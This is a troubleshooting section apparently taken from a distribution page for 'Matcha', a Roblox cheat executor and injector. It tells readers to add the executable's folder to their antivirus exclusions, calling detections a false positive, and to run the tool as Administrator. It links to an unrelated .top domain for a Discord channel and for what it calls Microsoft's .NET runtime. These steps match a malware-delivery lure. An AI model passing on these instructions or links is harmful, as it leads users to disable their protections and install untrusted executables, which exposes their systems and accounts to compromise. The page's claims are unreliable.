## 🔧 Common Issues and Fixes

**❌ "Injection Failed" error**
> Make sure Roblox is fully loaded into a game before clicking Inject. Injecting from the main menu will always fail.

**❌ Antivirus deletes MatchaExecutor.exe**
> This is a false positive. Add the entire Matcha folder to your antivirus exclusion list before extracting the archive.

**❌ Executor crashes after Roblox update**
> Roblox updates can break injectors temporarily. Check the [#announcements](https://4m466.top/matcha) channel on the **matcha executor discord server** for a patch ETA — updates typically arrive within 24 hours.

**❌ Scripts not executing / no output**
> Ensure you're running Matcha as Administrator. Non-admin mode silently blocks low-level API calls required by the **matcha lua executor** engine.

**❌ "Level too low" error on some scripts**
> Some advanced scripts require a Level 7 executor. Matcha is a Level 7 executor — if you see this error, the script itself may have a version mismatch. Try updating the script.

**❌ UI not launching / blank window**
> Install or update [.NET 6.0 Runtime](https://4m466.top/matcha) from Microsoft. Missing runtime is the most common cause of blank windows on fresh installs.

**❌ Auto-execute not triggering**
> Go to Settings → Auto-Execute and ensure the toggle is enabled AND a script is saved in the auto-execute slot. Both conditions must be met.
